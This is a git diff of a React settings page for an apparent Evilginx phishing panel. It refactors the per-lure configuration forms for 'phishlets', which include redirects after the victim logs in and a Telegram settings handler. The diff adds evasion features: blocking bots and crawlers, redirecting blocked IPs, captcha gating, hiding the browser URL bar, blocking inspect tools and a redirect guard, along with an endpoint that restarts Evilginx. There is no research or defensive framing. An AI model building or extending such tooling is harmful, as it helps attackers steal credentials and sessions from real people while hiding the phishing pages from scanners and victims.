@@ -1,5 +1,5 @@
 import Layout from "@/components/Layout";
-import { useState, useEffect } from "react";
+import { useState, useEffect, useRef } from "react";
 import { toast } from "react-hot-toast";
 import { Session } from "@/types";
 import useSWR from "swr";
@@ -18,6 +18,7 @@ interface Lure {
   redirect_url: string;
   redirector: string;
   ua_filter: string;
+  formState?: LureFormState;
 }
 
 // Added this interface to track form state for each lure independently
@@ -25,10 +26,442 @@ interface LureFormState {
   redirectUrl: string;
   useCaptcha: boolean;
   linkPath: string;
+  blockBots: boolean;
+  botRedirectLink: string;
+  hideUrlBar: boolean;
+  blockInspect: boolean;
+  redirectGuard: boolean;
 }
 
 interface LuresResponse {
   lures: Lure[];
+}
+
+// Define default security settings to use when securityData is not available
+const defaultSecuritySettings = {
+  blockBots: true,
+  redirectUrl: "",
+  hideUrlBar: true,
+  blockInspect: true,
+  redirectGuard: true,
+};
+
+// Define a LureForm component that handles its own state completely independently
+function LureForm({
+  lure,
+  index,
+}: {
+  lure: Lure;
+  index: number; // Add explicit index prop
+}) {
+  const [formState, setFormState] = useState<LureFormState>(() => {
+    const cleanPath = lure.path.startsWith("/")
+      ? lure.path.substring(1)
+      : lure.path;
+
+    // Only use this specific lure's data, don't reference any other lure
+    return {
+      linkPath: cleanPath,
+      redirectUrl: lure.redirect_url || "",
+      useCaptcha: lure.redirector === "main",
+      blockBots: lure.formState?.blockBots ?? true,
+      botRedirectLink: lure.formState?.botRedirectLink || "",
+      hideUrlBar: lure.formState?.hideUrlBar ?? true,
+      blockInspect: lure.formState?.blockInspect ?? true,
+      redirectGuard: lure.formState?.redirectGuard ?? true,
+    };
+  });
+
+  const [isLoading, setIsLoading] = useState(false);
+  const [saving, setSaving] = useState(false);
+  const hasLoaded = useRef(false); // Add a ref to track if data has been loaded
+
+  // Load the lure data only once on mount, strictly for this specific lure
+  useEffect(() => {
+    // Skip if already loaded
+    if (hasLoaded.current) return;
+
+    const fetchLureData = async () => {
+      setIsLoading(true);
+      try {
+        console.log(
+          `Fetching data for lure index ${index} (${lure.phishlet}): ${lure.path}`
+        );
+
+        // Fetch lure config specifically for this lure by index
+        const lureConfigResponse = await fetch(
+          `/api/full-link?lureIndex=${index}`
+        );
+        if (!lureConfigResponse.ok) {
+          throw new Error(`Failed to fetch config for lure index ${index}`);
+        }
+
+        // Fetch security settings specifically for this lure
+        const securityResponse = await fetch(
+          `/api/security-settings?lureIndex=${index}`
+        );
+        if (!securityResponse.ok) {
+          throw new Error(
+            `Failed to fetch security settings for lure index ${index}`
+          );
+        }
+
+        const lureConfig = await lureConfigResponse.json();
+        const securityData = await securityResponse.json();
+
+        console.log(
+          `[LureForm] Fetched config for lure index ${index}:`,
+          lureConfig
+        );
+        console.log(
+          `[LureForm] Fetched security settings for lure index ${index}:`,
+          securityData
+        );
+
+        // Determine clean path
+        const cleanPath =
+          lureConfig.path ||
+          (lure.path.startsWith("/") ? lure.path.substring(1) : lure.path);
+
+        // Update form state with fetched data specific to this lure only
+        setFormState({
+          linkPath: cleanPath,
+          redirectUrl: lure.redirect_url || lureConfig.afterLoginRedirect || "",
+          useCaptcha: lure.redirector === "main",
+          blockBots: securityData.blockBots ?? true,
+          botRedirectLink: securityData.redirectUrl || "",
+          hideUrlBar: securityData.hideUrlBar ?? true,
+          blockInspect: securityData.blockInspect ?? true,
+          redirectGuard: securityData.redirectGuard ?? true,
+        });
+
+        console.log(`[LureForm] Updated form state for lure index ${index}`, {
+          linkPath: cleanPath,
+          redirectUrl: lure.redirect_url || lureConfig.afterLoginRedirect,
+          useCaptcha: lure.redirector === "main",
+        });
+
+        // Mark as loaded
+        hasLoaded.current = true;
+      } catch (error) {
+        console.error(
+          `[LureForm] Error loading lure index ${index} data:`,
+          error
+        );
+        toast.error(`Failed to load data for ${lure.phishlet}`);
+      } finally {
+        setIsLoading(false);
+      }
+    };
+
+    fetchLureData();
+  }, []); // Empty dependency array to run only once on mount
+
+  // Handle form field changes
+  const handleFieldChange = (
+    field: keyof LureFormState,
+    value: string | boolean
+  ) => {
+    console.log(
+      `[LureForm] Updating field ${field} for lure index ${index} to:`,
+      value
+    );
+    setFormState((prev) => ({
+      ...prev,
+      [field]: value,
+    }));
+  };
+
+  // Handle form submission
+  const handleSubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
+    console.log(
+      `[LureForm] Submitting form for lure index ${index} (${lure.phishlet})`
+    );
+
+    try {
+      setSaving(true);
+
+      // Security settings request with lure-specific settings
+      const securityRequestBody = {
+        hideUrlBar: formState.hideUrlBar,
+        blockInspect: formState.blockInspect,
+        redirectGuard: formState.redirectGuard,
+        blockBots: formState.blockBots,
+        redirectUrl: formState.botRedirectLink,
+        lureId: lure.id,
+        lureIndex: index, // Add explicit index for server to use
+      };
+
+      console.log(
+        "[LureForm] Submitting security settings:",
+        securityRequestBody
+      );
+
+      const securityResponse = await fetch("/api/security-settings", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(securityRequestBody),
+      });
+
+      if (!securityResponse.ok) {
+        throw new Error("Failed to update security settings");
+      }
+
+      // Link settings request with this specific lure's data
+      const linkRequestBody = {
+        afterLoginRedirect: formState.redirectUrl,
+        useCaptcha: formState.useCaptcha,
+        linkPath: formState.linkPath,
+        lureId: lure.id,
+        lureIndex: index, // Add explicit index for server to use
+      };
+
+      console.log("[LureForm] Submitting link settings:", linkRequestBody);
+
+      const linkResponse = await fetch("/api/link-settings", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(linkRequestBody),
+      });
+
+      if (!linkResponse.ok) {
+        throw new Error("Failed to update link settings");
+      }
+
+      // Restart evilginx after updating settings
+      await fetch("/api/restart-evilginx", {
+        method: "POST",
+      });
+
+      // Update the localStorage with the selected lure ID and index
+      localStorage.setItem("selectedLureId", lure.id);
+      localStorage.setItem("selectedLureIndex", index.toString());
+
+      // Emit custom events with lure index to ensure they only affect this lure
+      const securityEvent = new CustomEvent("securitySettingsUpdated", {
+        detail: {
+          lureId: lure.id,
+          lureIndex: index,
+          settings: securityRequestBody,
+        },
+      });
+      window.dispatchEvent(securityEvent);
+
+      const linkEvent = new CustomEvent("linkSettingsUpdated", {
+        detail: {
+          lureId: lure.id,
+          lureIndex: index,
+          settings: linkRequestBody,
+        },
+      });
+      window.dispatchEvent(linkEvent);
+
+      toast.success(`${lure.phishlet} lure settings updated successfully`);
+    } catch (error) {
+      console.error("[LureForm] Error updating lure settings:", error);
+      toast.error(`Failed to update ${lure.phishlet} lure settings`);
+    } finally {
+      setSaving(false);
+    }
+  };
+
+  return (
+    <section className="bg-[#232A34] rounded-lg p-6">
+      <div className="flex justify-between items-center mb-4">
+        <h2 className="text-white text-xl">
+          Link Configuration: {lure.phishlet} ({lure.path})
+        </h2>
+        {isLoading && (
+          <div className="flex items-center text-gray-400">
+            <svg
+              className="animate-spin -ml-1 mr-2 h-4 w-4 text-white"
+              xmlns="http://www.w3.org/2000/svg"
+              fill="none"
+              viewBox="0 0 24 24"
+            >
+              <circle
+                className="opacity-25"
+                cx="12"
+                cy="12"
+                r="10"
+                stroke="currentColor"
+                strokeWidth="4"
+              ></circle>
+              <path
+                className="opacity-75"
+                fill="currentColor"
+                d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
+              ></path>
+            </svg>
+            Loading...
+          </div>
+        )}
+      </div>
+
+      <form onSubmit={handleSubmit} className="space-y-6">
+        {/* Link Path - Pre-filled with this lure's path */}
+        <div>
+          <label className="block text-gray-400 mb-2">
+            Link Path for {lure.phishlet}
+          </label>
+          <input
+            type="text"
+            data-allow-select="true"
+            className="w-full bg-[#1B2028] text-white p-3 rounded"
+            value={formState.linkPath}
+            onChange={(e) => handleFieldChange("linkPath", e.target.value)}
+            placeholder="Enter path (without leading /)"
+          />
+          <p className="text-xs text-gray-500 mt-1">
+            The path will always start with &quot;/&quot; in the system
+          </p>
+        </div>
+
+        {/* Redirect Settings */}
+        <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
+          <div>
+            <label className="block text-gray-400 mb-2">
+              After Login Redirect URL
+            </label>
+            <input
+              type="text"
+              data-allow-select="true"
+              className="w-full bg-[#1B2028] text-white p-3 rounded"
+              value={formState.redirectUrl}
+              onChange={(e) => handleFieldChange("redirectUrl", e.target.value)}
+              placeholder="https://example.com"
+            />
+          </div>
+
+          <div>
+            <label className="block text-gray-400 mb-2">
+              Redirect URL for Blocked IPs
+            </label>
+            <input
+              type="text"
+              data-allow-select="true"
+              className="w-full bg-[#1B2028] text-white p-3 rounded"
+              value={formState.botRedirectLink}
+              onChange={(e) =>
+                handleFieldChange("botRedirectLink", e.target.value)
+              }
+              placeholder="https://example.com"
+            />
+          </div>
+        </div>
+
+        {/* Security and Captcha Settings */}
+        <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
+          <div>
+            <h3 className="text-gray-400 mb-3">Bot Protection</h3>
+            <div className="space-y-2">
+              <label className="flex items-center space-x-2">
+                <input
+                  type="radio"
+                  data-allow-select="true"
+                  checked={formState.blockBots}
+                  onChange={() => handleFieldChange("blockBots", true)}
+                  className="text-indigo-500"
+                />
+                <span className="text-gray-400">
+                  Block All Bots And Crawlers
+                </span>
+              </label>
+              <label className="flex items-center space-x-2">
+                <input
+                  type="radio"
+                  data-allow-select="true"
+                  checked={!formState.blockBots}
+                  onChange={() => handleFieldChange("blockBots", false)}
+                  className="text-indigo-500"
+                />
+                <span className="text-gray-400">Do Not Block Bots</span>
+              </label>
+            </div>
+          </div>
+
+          <div>
+            <h3 className="text-gray-400 mb-3">Captcha Settings</h3>
+            <div className="space-y-2">
+              <label className="flex items-center space-x-2">
+                <input
+                  type="radio"
+                  data-allow-select="true"
+                  checked={formState.useCaptcha}
+                  onChange={() => handleFieldChange("useCaptcha", true)}
+                  className="text-indigo-500"
+                />
+                <span className="text-gray-400">Use Cloudflare Captcha</span>
+              </label>
+              <label className="flex items-center space-x-2">
+                <input
+                  type="radio"
+                  data-allow-select="true"
+                  checked={!formState.useCaptcha}
+                  onChange={() => handleFieldChange("useCaptcha", false)}
+                  className="text-indigo-500"
+                />
+                <span className="text-gray-400">Do Not Use Captcha</span>
+              </label>
+            </div>
+          </div>
+        </div>
+
+        {/* Additional Security Settings */}
+        <div className="space-y-3 mt-4">
+          <h3 className="text-gray-400 mb-2">Additional Security Settings</h3>
+          <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
+            <label className="flex items-center space-x-2">
+              <input
+                type="checkbox"
+                checked={formState.hideUrlBar}
+                onChange={(e) =>
+                  handleFieldChange("hideUrlBar", e.target.checked)
+                }
+                className="text-indigo-500"
+              />
+              <span className="text-gray-400">Hide URL Bar</span>
+            </label>
+
+            <label className="flex items-center space-x-2">
+              <input
+                type="checkbox"
+                checked={formState.blockInspect}
+                onChange={(e) =>
+                  handleFieldChange("blockInspect", e.target.checked)
+                }
+                className="text-indigo-500"
+              />
+              <span className="text-gray-400">Block Inspect</span>
+            </label>
+
+            <label className="flex items-center space-x-2">
+              <input
+                type="checkbox"
+                checked={formState.redirectGuard}
+                onChange={(e) =>
+                  handleFieldChange("redirectGuard", e.target.checked)
+                }
+                className="text-indigo-500"
+              />
+              <span className="text-gray-400">Redirect Guard</span>
+            </label>
+          </div>
+        </div>
+
+        <button
+          type="submit"
+          disabled={saving}
+          className={`bg-indigo-500 text-white px-6 py-2 rounded ${
+            saving ? "opacity-50 cursor-not-allowed" : "hover:bg-indigo-600"
+          } transition-colors`}
+        >
+          {saving ? "Saving..." : `Save ${lure.phishlet} Configuration`}
+        </button>
+      </form>
+    </section>
+  );
 }
 
 export default function Settings() {
@@ -58,10 +491,6 @@ export default function Settings() {
   const [showSuccess, setShowSuccess] = useState(false);
   const [error, setError] = useState<string | null>(null);
   const [lures, setLures] = useState<Lure[]>([]);
-  // New state to track form data for each lure independently
-  const [lureFormStates, setLureFormStates] = useState<
-    Record<string, LureFormState>
-  >({});
 
   // Define the fetcher function for SWR
   const fetcher = (url: string) => fetch(url).then((res) => res.json());
@@ -156,100 +585,11 @@ export default function Settings() {
 
         // Get the lures data
         const fetchedLures = luresData.lures || [];
-        setLures(fetchedLures);
 
-        // Prepare form states for all lures
-        const newFormStates: Record<string, LureFormState> = {};
-
-        // If there are lures available
-        if (fetchedLures.length > 0) {
-          console.log("Processing fetched lures...");
-          let lureToSelect: Lure | null = null;
-
-          // First try to use the saved lure ID from localStorage
-          if (savedLureId) {
-            const savedLure = fetchedLures.find(
-              (lure) => lure.id === savedLureId
-            );
-            if (savedLure) {
-              console.log("Found saved lure:", savedLure.phishlet);
-              lureToSelect = savedLure;
-
-              // Fetch the specific lure's full configuration
-              try {
-                const lureConfigResponse = await fetch(
-                  `/api/full-link?lureId=${savedLureId}`
-                );
-                if (lureConfigResponse.ok) {
-                  const lureConfig = await lureConfigResponse.json();
-                  console.log("Fetched lure config:", lureConfig);
-
-                  // Set up form state for this lure
-                  if (lureToSelect) {
-                    const cleanPath =
-                      lureConfig.path ||
-                      (lureToSelect.path.startsWith("/")
-                        ? lureToSelect.path.substring(1)
-                        : lureToSelect.path);
-
-                    newFormStates[savedLure.id] = {
-                      linkPath: cleanPath,
-                      redirectUrl:
-                        lureToSelect.redirect_url ||
-                        linkData.afterLoginRedirect,
-                      useCaptcha: lureToSelect.redirector === "main",
-                    };
-
-                    console.log(
-                      `Created form state for saved lure ${savedLure.id}:`,
-                      newFormStates[savedLure.id]
-                    );
-                  }
-                }
-              } catch (error) {
-                console.error("Error fetching lure configuration:", error);
-              }
-            }
-          }
-
-          // If no saved lure found, try to match with current link path
-          if (!lureToSelect) {
-            const currentLure = fetchedLures.find(
-              (lure) =>
-                lure.path === `/${linkData.linkPath}` ||
-                lure.path === linkData.linkPath
-            );
-
-            if (currentLure) {
-              console.log("Found matching lure by path:", currentLure.phishlet);
-              lureToSelect = currentLure;
-            }
-          }
-
-          // Create form states for all lures
-          fetchedLures.forEach((lure) => {
-            // Skip if we already set up this lure's form state above
-            if (newFormStates[lure.id]) return;
-
-            const cleanPath = lure.path.startsWith("/")
-              ? lure.path.substring(1)
-              : lure.path;
-
-            newFormStates[lure.id] = {
-              linkPath: cleanPath,
-              redirectUrl: lure.redirect_url || linkData.afterLoginRedirect,
-              useCaptcha: lure.redirector === "main",
-            };
-
-            console.log(
-              `Created form state for lure ${lure.id} (${lure.phishlet}):`,
-              newFormStates[lure.id]
-            );
-          });
+        // Set lures once and don't modify them in this effect
+        if (fetchedLures.length > 0 && lures.length === 0) {
+          setLures(fetchedLures);
         }
-
-        // Update all form states
-        setLureFormStates(newFormStates);
 
         // Set the settings with the data we have
         setSettings((prev) => ({
@@ -262,6 +602,9 @@ export default function Settings() {
           useCaptcha: linkData.useCaptcha,
           linkPath: linkData.linkPath || "",
           blacklistedIPs: blacklistData.ips || [],
+          hideUrlBar: securityData.hideUrlBar,
+          blockInspect: securityData.blockInspect,
+          redirectGuard: securityData.redirectGuard,
         }));
 
         console.log("Settings fetch and initialization complete");
@@ -273,95 +616,186 @@ export default function Settings() {
       }
     };
     fetchSettings();
-  }, []);
+  }, []); // Empty dependency array so it only runs once on mount
 
   // Initialize form state for each lure
   useEffect(() => {
     if (lures.length > 0) {
       console.log("Initializing form states for lures:", lures.length);
 
-      const initialFormStates: Record<string, LureFormState> = {};
+      // First create a deep copy of the lures to avoid modifying state directly
+      const luresWithForms = [...lures];
 
-      lures.forEach((lure) => {
-        const cleanPath = lure.path.startsWith("/")
-          ? lure.path.substring(1)
-          : lure.path;
+      // Now load initial form states for each lure independently
+      const initializeLures = async () => {
+        for (let i = 0; i < luresWithForms.length; i++) {
+          const lure = luresWithForms[i];
 
-        initialFormStates[lure.id] = {
-          redirectUrl: lure.redirect_url || settings.afterLoginRedirect,
-          useCaptcha: lure.redirector === "main",
-          linkPath: cleanPath,
-        };
+          try {
+            // Attempt to get lure-specific settings using index
+            const response = await fetch(`/api/full-link?lureIndex=${i}`);
 
-        console.log(
-          `Initialized form state for lure ${lure.id} (${lure.phishlet}):`,
-          initialFormStates[lure.id]
-        );
-      });
+            if (response.ok) {
+              const data = await response.json();
 
-      setLureFormStates((prev) => {
-        // Maintain existing form states for lures that haven't changed
-        const updated = { ...prev };
+              // Determine clean path
+              const cleanPath = lure.path.startsWith("/")
+                ? lure.path.substring(1)
+                : lure.path;
 
-        // Add/update form states for new or changed lures
-        Object.entries(initialFormStates).forEach(([lureId, formState]) => {
-          // Only update if this lure doesn't have a form state yet, or if key fields have changed
-          if (
-            !prev[lureId] ||
-            prev[lureId].linkPath !== formState.linkPath ||
-            prev[lureId].redirectUrl !== formState.redirectUrl
-          ) {
-            updated[lureId] = formState;
+              // Set initial form state for this specific lure only
+              luresWithForms[i] = {
+                ...lure,
+                formState: {
+                  linkPath: data.path || cleanPath,
+                  redirectUrl:
+                    lure.redirect_url || data.afterLoginRedirect || "",
+                  useCaptcha: lure.redirector === "main",
+                  blockBots: data.blockBots ?? true,
+                  botRedirectLink: data.redirectUrl || "",
+                  hideUrlBar: data.hideUrlBar ?? true,
+                  blockInspect: data.blockInspect ?? true,
+                  redirectGuard: data.redirectGuard ?? true,
+                },
+              };
+
+              console.log(
+                `Initialized form state for lure index ${i} (${lure.phishlet}): ${lure.path}`
+              );
+            } else {
+              // Use defaults if we can't get specific settings
+              const cleanPath = lure.path.startsWith("/")
+                ? lure.path.substring(1)
+                : lure.path;
+
+              luresWithForms[i] = {
+                ...lure,
+                formState: {
+                  linkPath: cleanPath,
+                  redirectUrl: lure.redirect_url || "",
+                  useCaptcha: lure.redirector === "main",
+                  blockBots: true,
+                  botRedirectLink: "",
+                  hideUrlBar: true,
+                  blockInspect: true,
+                  redirectGuard: true,
+                },
+              };
+
+              console.log(
+                `Using default settings for lure index ${i} (${lure.phishlet}): ${lure.path}`
+              );
+            }
+          } catch (error) {
+            console.error(`Error initializing lure index ${i}:`, error);
+            // Set defaults for this lure in case of error
+            const cleanPath = lure.path.startsWith("/")
+              ? lure.path.substring(1)
+              : lure.path;
+
+            luresWithForms[i] = {
+              ...lure,
+              formState: {
+                linkPath: cleanPath,
+                redirectUrl: lure.redirect_url || "",
+                useCaptcha: lure.redirector === "main",
+                blockBots: true,
+                botRedirectLink: "",
+                hideUrlBar: true,
+                blockInspect: true,
+                redirectGuard: true,
+              },
+            };
           }
-        });
+        }
 
-        return updated;
-      });
+        // Now update all the lures at once to avoid multiple state updates
+        setLures(luresWithForms);
+      };
+
+      initializeLures();
     }
-  }, [lures, settings.afterLoginRedirect]);
+  }, [lures.length]); // Only run when lure count changes
 
   // Enhance the lureChanged event listener to update all form fields completely
   useEffect(() => {
+    // Only run once to set up the event listener
     const handleLureChangedEvent = async (event: CustomEvent) => {
       if (event.detail) {
-        const { lureId } = event.detail;
-        if (!lureId) return;
+        const { lureIndex } = event.detail;
+        if (lureIndex === undefined || lureIndex === null) return;
 
-        // Find the lure with this ID
-        const selected = lures.find((lure) => lure.id === lureId);
-        if (!selected) return;
+        // Get the lure at this specific index in the array
+        if (lureIndex < 0 || lureIndex >= lures.length) {
+          console.log(
+            `Invalid lure index: ${lureIndex}, lures length: ${lures.length}`
+          );
+          return;
+        }
+
+        const selected = lures[lureIndex];
+        console.log(
+          `Processing lure changed event for lure index ${lureIndex} (${selected.phishlet}): ${selected.path}`
+        );
 
         try {
-          // Fetch the full configuration for this lure to get all settings
+          // Fetch the full configuration for this specific lure
           const lureConfigResponse = await fetch(
-            `/api/full-link?lureId=${lureId}`
+            `/api/full-link?lureIndex=${lureIndex}`
           );
+
+          // Also fetch the security settings for this specific lure
+          const securityResponse = await fetch(
+            `/api/security-settings?lureIndex=${lureIndex}`
+          );
+
+          let securityData = defaultSecuritySettings;
+          if (securityResponse.ok) {
+            securityData = await securityResponse.json();
+          }
+
           if (lureConfigResponse.ok) {
             const lureConfig = await lureConfigResponse.json();
 
-            // Determine the clean path
+            // Determine clean path
             const cleanPath = selected.path.startsWith("/")
               ? selected.path.substring(1)
               : selected.path;
 
-            // Update the form state for this specific lure
-            setLureFormStates((prev) => ({
-              ...prev,
-              [lureId]: {
-                linkPath: lureConfig.path || cleanPath,
-                redirectUrl:
-                  selected.redirect_url || settings.afterLoginRedirect,
-                useCaptcha: selected.redirector === "main",
-              },
-            }));
+            // Update ONLY this specific lure's form state in the array
+            setLures((prev) => {
+              const newLures = [...prev];
+              if (newLures[lureIndex]) {
+                newLures[lureIndex] = {
+                  ...newLures[lureIndex],
+                  formState: {
+                    linkPath: lureConfig.path || cleanPath,
+                    redirectUrl:
+                      selected.redirect_url ||
+                      lureConfig.afterLoginRedirect ||
+                      "",
+                    useCaptcha: selected.redirector === "main",
+                    blockBots: securityData.blockBots ?? true,
+                    botRedirectLink: securityData.redirectUrl || "",
+                    hideUrlBar: securityData.hideUrlBar ?? true,
+                    blockInspect: securityData.blockInspect ?? true,
+                    redirectGuard: securityData.redirectGuard ?? true,
+                  },
+                };
+              }
+              return newLures;
+            });
 
             // Display a notification that settings form has been updated
             toast.success(
-              `Form updated to reflect "${selected.phishlet} - ${selected.path}" settings`
+              `Updated settings for "${selected.phishlet} - ${selected.path}"`
             );
           }
         } catch (error) {
-          console.error("Error fetching lure configuration:", error);
+          console.error(
+            `Error fetching lure configuration for index ${lureIndex}:`,
+            error
+          );
 
           // If API call fails, still update with basic information
           const cleanPath = selected.path.startsWith("/")
@@ -369,34 +803,65 @@ export default function Settings() {
             : selected.path;
 
           // Update with basic information even if the API call fails
-          setLureFormStates((prev) => ({
-            ...prev,
-            [lureId]: {
-              linkPath: cleanPath,
-              redirectUrl: selected.redirect_url || settings.afterLoginRedirect,
-              useCaptcha: selected.redirector === "main",
-            },
-          }));
+          setLures((prev) => {
+            const newLures = [...prev];
+            if (newLures[lureIndex]) {
+              newLures[lureIndex] = {
+                ...newLures[lureIndex],
+                formState: {
+                  linkPath: cleanPath,
+                  redirectUrl: selected.redirect_url || "",
+                  useCaptcha: selected.redirector === "main",
+                  blockBots: true,
+                  botRedirectLink: "",
+                  hideUrlBar: true,
+                  blockInspect: true,
+                  redirectGuard: true,
+                },
+              };
+            }
+            return newLures;
+          });
 
-          toast.error("Partially updated form with available lure settings");
+          toast.error(`Partially updated settings for "${selected.phishlet}"`);
         }
       }
     };
 
-    // Add the event listener
+    // Add event listeners for all the custom events with specific handlers
     window.addEventListener(
       "lureChanged",
       handleLureChangedEvent as EventListener
     );
 
-    // Remove the event listener on cleanup
+    window.addEventListener(
+      "securitySettingsUpdated",
+      handleLureChangedEvent as EventListener
+    );
+
+    window.addEventListener(
+      "linkSettingsUpdated",
+      handleLureChangedEvent as EventListener
+    );
+
+    // Remove all event listeners on cleanup
     return () => {
       window.removeEventListener(
         "lureChanged",
         handleLureChangedEvent as EventListener
       );
+
+      window.removeEventListener(
+        "securitySettingsUpdated",
+        handleLureChangedEvent as EventListener
+      );
+
+      window.removeEventListener(
+        "linkSettingsUpdated",
+        handleLureChangedEvent as EventListener
+      );
     };
-  }, [lures, settings.afterLoginRedirect]);
+  }, []); // Empty dependency array to set up event listener only once
 
   const handleTelegramSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -430,148 +895,6 @@ export default function Settings() {
       setTimeout(() => setError(null), 3000);
     } finally {
       setLoading(false);
-    }
-  };
-
-  // Improve the handleLureFormChange function to ensure proper isolation
-  const handleLureFormChange = (
-    lureId: string,
-    field: keyof LureFormState,
-    value: string | boolean
-  ) => {
-    console.log(`Updating lure ${lureId} field ${field} to:`, value);
-
-    setLureFormStates((prev) => {
-      // First, create a copy of the previous state
-      const newState = { ...prev };
-
-      // Ensure this lure has a form state
-      if (!newState[lureId]) {
-        // Find the lure in the lures array
-        const lure = lures.find((l) => l.id === lureId);
-        if (!lure) return prev; // No change if lure not found
-
-        // Create the initial form state for this lure
-        const cleanPath = lure.path.startsWith("/")
-          ? lure.path.substring(1)
-          : lure.path;
-        newState[lureId] = {
-          linkPath: cleanPath,
-          redirectUrl: lure.redirect_url || settings.afterLoginRedirect,
-          useCaptcha: lure.redirector === "main",
-        };
-      }
-
-      // Now update the specific field
-      newState[lureId] = {
-        ...newState[lureId],
-        [field]: value,
-      };
-
-      return newState;
-    });
-  };
-
-  // Modified submit handler for individual lure forms
-  const handleLureFormSubmit = async (e: React.FormEvent, lure: Lure) => {
-    e.preventDefault();
-    console.log(`Submitting form for lure ${lure.id} (${lure.phishlet})`);
-
-    try {
-      setSaving(true);
-
-      // Get the form state for this specific lure
-      const formState = lureFormStates[lure.id];
-      if (!formState) {
-        console.error(`No form state found for lure ${lure.id}`);
-        return;
-      }
-
-      console.log(`Form state for lure ${lure.id}:`, formState);
-
-      // Security settings request
-      const securityRequestBody = {
-        hideUrlBar: settings.hideUrlBar,
-        blockInspect: settings.blockInspect,
-        redirectGuard: settings.redirectGuard,
-      };
-
-      const securityResponse = await fetch("/api/security-settings", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(securityRequestBody),
-      });
-
-      if (!securityResponse.ok) {
-        throw new Error("Failed to update security settings");
-      }
-
-      // Link settings request with this specific lure's data
-      const linkRequestBody = {
-        afterLoginRedirect: formState.redirectUrl,
-        useCaptcha: formState.useCaptcha,
-        linkPath: formState.linkPath,
-        lureId: lure.id,
-      };
-
-      const linkResponse = await fetch("/api/link-settings", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(linkRequestBody),
-      });
-
-      if (!linkResponse.ok) {
-        throw new Error("Failed to update link settings");
-      }
-
-      // Restart evilginx after updating settings
-      await fetch("/api/restart-evilginx", {
-        method: "POST",
-      });
-
-      // Update the localStorage with the selected lure ID
-      localStorage.setItem("selectedLureId", lure.id);
-
-      // Update the lures array with the new data
-      setLures((prevLures) =>
-        prevLures.map((l) =>
-          l.id === lure.id
-            ? {
-                ...l,
-                redirect_url: formState.redirectUrl,
-                redirector: formState.useCaptcha ? "main" : "",
-              }
-            : l
-        )
-      );
-
-      // Emit custom events
-      const securityEvent = new CustomEvent("securitySettingsUpdated", {
-        detail: {
-          lureId: lure.id,
-          settings: securityRequestBody,
-        },
-      });
-      window.dispatchEvent(securityEvent);
-
-      const linkEvent = new CustomEvent("linkSettingsUpdated", {
-        detail: {
-          lureId: lure.id,
-          settings: linkRequestBody,
-        },
-      });
-      window.dispatchEvent(linkEvent);
-
-      setShowSuccess(true);
-      setTimeout(() => setShowSuccess(false), 3000);
-
-      // Single success toast for both updates
-      toast.success(`${lure.phishlet} lure settings updated successfully`);
-    } catch (error) {
-      console.error("Error updating lure settings:", error);
-      toast.error(`Failed to update ${lure.phishlet} lure settings`);
-    } finally {
-      setSaving(false);
     }
   };
 
@@ -823,161 +1146,8 @@ export default function Settings() {
 
         {/* Dynamic Lure Configuration Sections - Generate one section per lure */}
         {lures.length > 0 ? (
-          lures.map((lure) => (
-            <section key={lure.id} className="bg-[#232A34] rounded-lg p-6">
-              <h2 className="text-white text-xl mb-4">
-                Link Configuration: {lure.phishlet} ({lure.path})
-              </h2>
-              <form
-                onSubmit={(e) => handleLureFormSubmit(e, lure)}
-                className="space-y-6"
-              >
-                {/* Link Path - Pre-filled with this lure's path */}
-                <div>
-                  <label className="block text-gray-400 mb-2">
-                    Link Path for {lure.phishlet}
-                  </label>
-                  <input
-                    type="text"
-                    data-allow-select="true"
-                    className="w-full bg-[#1B2028] text-white p-3 rounded"
-                    value={lureFormStates[lure.id]?.linkPath || ""}
-                    onChange={(e) =>
-                      handleLureFormChange(lure.id, "linkPath", e.target.value)
-                    }
-                    placeholder="Enter path (without leading /)"
-                  />
-                  <p className="text-xs text-gray-500 mt-1">
-                    The path will always start with &quot;/&quot; in the system
-                  </p>
-                </div>
-
-                {/* Redirect Settings */}
-                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
-                  <div>
-                    <label className="block text-gray-400 mb-2">
-                      After Login Redirect URL
-                    </label>
-                    <input
-                      type="text"
-                      data-allow-select="true"
-                      className="w-full bg-[#1B2028] text-white p-3 rounded"
-                      value={lureFormStates[lure.id]?.redirectUrl || ""}
-                      onChange={(e) =>
-                        handleLureFormChange(
-                          lure.id,
-                          "redirectUrl",
-                          e.target.value
-                        )
-                      }
-                      placeholder="https://example.com"
-                    />
-                  </div>
-
-                  <div>
-                    <label className="block text-gray-400 mb-2">
-                      Redirect URL for Blocked IPs
-                    </label>
-                    <input
-                      type="text"
-                      data-allow-select="true"
-                      className="w-full bg-[#1B2028] text-white p-3 rounded"
-                      value={settings.botRedirectLink}
-                      onChange={(e) =>
-                        setSettings({
-                          ...settings,
-                          botRedirectLink: e.target.value,
-                        })
-                      }
-                      placeholder="https://example.com"
-                    />
-                  </div>
-                </div>
-
-                {/* Security and Captcha Settings */}
-                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
-                  <div>
-                    <h3 className="text-gray-400 mb-3">Bot Protection</h3>
-                    <div className="space-y-2">
-                      <label className="flex items-center space-x-2">
-                        <input
-                          type="radio"
-                          data-allow-select="true"
-                          checked={settings.blockBots}
-                          onChange={() =>
-                            setSettings({ ...settings, blockBots: true })
-                          }
-                          className="text-indigo-500"
-                        />
-                        <span className="text-gray-400">
-                          Block All Bots And Crawlers
-                        </span>
-                      </label>
-                      <label className="flex items-center space-x-2">
-                        <input
-                          type="radio"
-                          data-allow-select="true"
-                          checked={!settings.blockBots}
-                          onChange={() =>
-                            setSettings({ ...settings, blockBots: false })
-                          }
-                          className="text-indigo-500"
-                        />
-                        <span className="text-gray-400">Do Not Block Bots</span>
-                      </label>
-                    </div>
-                  </div>
-
-                  <div>
-                    <h3 className="text-gray-400 mb-3">Captcha Settings</h3>
